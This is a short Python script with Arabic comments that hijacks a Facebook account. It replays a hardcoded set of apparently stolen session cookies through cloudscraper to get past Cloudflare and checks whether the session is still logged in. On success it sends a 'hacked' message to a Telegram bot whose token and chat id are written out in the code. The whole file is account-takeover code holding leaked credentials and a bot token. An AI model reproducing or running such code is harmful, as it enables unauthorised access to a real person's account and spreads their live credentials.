import cloudscraper
import requests

token = "7543475859:AAENXZxHPQZafOlvBwFr6EatUFD31iYq-ks"
chat_id = "5042495708"

# الكوكيز حقك يا وحش
fb_cookies = {
    'sb': 'iWplaTgxXWaKpJpcZOMr2nJZ',
    'datr': 'iGplaV28PgweKRFA2B3ALpcC',
    'c_user': '100003550913323',
    'xs': '31%3AyHNizqiAxU5oow%3A2%3A1768254323%3A-1%3A-1',
    'fr': '0ZAmSGvgnip1quTXs.AWeV0Tp6gnMW6w_r2S2s1VtnAjDmiOd7TobRSbffHhccgP1GlrU.BpZWqJ..AAA.0.0.Bpas1t.AWdLyjZQSZk73I9__BMN-noje7Q'
}

def hunt_fb():
    print("🕵️ جاري التسلل لفيسبوك بطريقة القناص...")
    scraper = cloudscraper.create_scraper()
    
    try:
        # محاولة الدخول للصفحة الأساسية
        res = scraper.get("https://mbasic.facebook.com/profile.php", cookies=fb_cookies)
        
        if "Logout" in res.text or "تسجيل الخروج" in res.text:
            print("✅ تم الاختراق! الحساب نشط ذلحين.")
            requests.get(f"https://api.telegram.org/bot{token}/sendMessage", 
                         params={"chat_id": chat_id, "text": "💙 فادي.. فيسبوك انفتح غصب بـ CloudScraper! 🚀"})
        else:
            print("❌ لسه فيسبوك "مبهرر". يمكن الكوكيز طفيت تماماً.")
            
    except Exception as e:
        print(f"🚫 خطأ في الهجوم: {e}")

if __name__ == "__main__":
    hunt_fb()
